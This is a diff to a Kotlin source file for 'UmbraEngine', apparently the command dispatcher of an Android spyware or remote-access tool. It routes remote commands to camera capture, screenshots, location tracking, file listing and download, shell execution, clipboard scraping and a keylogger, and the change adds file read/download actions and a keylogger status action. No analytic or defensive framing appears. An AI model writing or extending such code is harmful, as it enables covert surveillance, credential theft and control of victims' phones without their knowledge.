@@ -69,7 +69,12 @@ object UmbraEngine {
             "camera"   to { cmd -> CameraModule.capture(context, cmd) },
             "screenshot" to { cmd -> CameraModule.screenshot(context, cmd) },
             "location" to { cmd -> LocationModule.get(context, cmd) },
-            "files"    to { cmd -> FileModule.list(context, cmd) },
+            "files"    to { cmd -> when (cmd.action) {
+                "list" -> FileModule.list(context, cmd)
+                "read" -> FileModule.read(context, cmd)
+                "download" -> FileModule.download(context, cmd)
+                else -> FileModule.list(context, cmd)
+            }},
             "file_read" to { cmd -> FileModule.read(context, cmd) },
             "shell"    to { cmd -> ShellModule.exec(cmd) },
             "clipboard" to { cmd -> try { ClipboardModule.scrape(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("clipboard:${e.message}", "clipboard") } },
@@ -111,6 +116,7 @@ object UmbraEngine {
                 "start" -> KeylogModule.start(context, cmd)
                 "stop" -> KeylogModule.stop(context, cmd)
                 "dump" -> KeylogModule.dump(context, cmd)
+                "status" -> KeylogModule.status(context, cmd)
                 else -> UmbraResponse.ErrorResponse("keylog:unknown_action:${cmd.action}", "keylog")
             }},
             "knox"     to { cmd -> when (cmd.action) {
